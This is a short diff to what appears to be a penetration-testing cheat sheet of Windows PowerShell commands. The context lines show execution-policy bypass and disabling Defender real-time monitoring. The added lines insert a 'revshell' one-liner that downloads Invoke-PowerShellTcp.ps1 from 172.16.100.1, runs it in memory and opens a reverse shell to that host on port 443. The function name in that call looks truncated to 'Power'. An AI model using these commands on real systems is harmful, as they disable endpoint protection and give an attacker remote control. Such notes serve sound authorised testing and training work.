@@ -19,6 +19,11 @@ powershell -ep bypass
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
+revshell
+```powershell
+powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.1/Invoke-PowerShellTcp.ps1'''); Power -Reverse -IPAddress 172.16.100.1 -Port 443
+```
+
 ## Applocker
 see app locker policy
 ```powershell
